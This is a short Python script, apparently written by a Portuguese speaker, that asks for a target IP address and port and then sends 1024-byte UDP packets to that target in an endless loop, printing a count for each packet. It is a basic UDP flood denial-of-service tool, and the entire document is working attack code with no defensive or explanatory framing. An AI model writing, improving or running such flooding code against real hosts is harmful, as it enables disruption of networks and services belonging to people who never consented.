import socket
import time

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

pacote = bytes(1024)

ip = input("Target IP: ")
port = int(input("Port: "))
enviado = 0

while True: 
    sock.sendto(pacote,(ip, port))
    print ("Pacote", enviado," para ",ip,":",port)
    enviado += 1

